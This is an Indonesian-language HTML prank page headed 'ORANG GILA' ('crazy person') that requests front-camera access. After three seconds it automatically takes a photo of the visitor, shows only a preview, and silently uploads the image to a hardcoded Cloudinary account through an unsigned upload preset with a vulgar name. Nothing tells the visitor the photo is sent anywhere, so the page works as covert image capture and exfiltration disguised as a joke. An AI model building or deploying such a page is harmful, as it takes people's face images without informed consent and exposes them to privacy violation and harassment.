<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kamera Otomatis</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            background: #f0f0f0; 
            font-family: Arial, sans-serif; 
            flex-direction: column;
        }
        .container {
            text-align: center;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
        }
        h1 { margin-bottom: 15px; }
        #preview {
            margin-top: 15px;
            width: 300px; 
            height: auto; 
            border-radius: 10px;
            border: 2px solid black;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ORANG GILA :</h1>
        <video id="camera" autoplay playsinline style="display: none;"></video>
        <canvas id="canvas" style="display: none;"></canvas>
        <img id="preview">
    </div>

    <script>
        const video = document.getElementById('camera');
        const canvas = document.getElementById('canvas');
        const preview = document.getElementById('preview');
        const ctx = canvas.getContext('2d');

        // 1. MINTA IZIN KAMERA SEBELUM MENGGUNAKAN
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    console.log("Kamera siap, mengambil foto dalam 3 detik...");
                    setTimeout(takePhoto, 3000);
                };
            })
            .catch(err => {
                console.error("Akses kamera ditolak!", err);
                alert("Izin kamera diperlukan untuk mengambil foto.");
            });

        // 2. AMBIL FOTO SETELAH KAMERA SIAP
        function takePhoto() {
            if (video.videoWidth === 0 || video.videoHeight === 0) {
                console.error("Kamera tidak siap!");
                alert("Kamera belum siap, coba lagi.");
                return;
            }

            console.log("Mengambil foto...");
            canvas.width = 600;  
            canvas.height = 800;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            preview.src = canvas.toDataURL("image/jpeg", 0.6);  
            console.log("Foto berhasil diambil.");

            canvas.toBlob(uploadToCloudinary, "image/jpeg", 0.6);
        }

        // 3. FUNGSI UPLOAD KE CLOUDINARY
        function uploadToCloudinary(imageBlob) {
            let cloudName = "dl5dswv7q";  
            let uploadPreset = "tikontol";  

            console.log("Mengunggah foto ke Cloudinary...");
            
            let formData = new FormData();
            formData.append("file", imageBlob);
            formData.append("upload_preset", uploadPreset);

            fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
                method: "POST",
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.secure_url) {
                    console.log("Foto berhasil diunggah:", data.secure_url);
                } else {
                    console.error("Gagal unggah! Respon:", data);
                }
            })
            .catch(error => console.error("Gagal upload!", error));
        }
    </script>
</body>
</html>
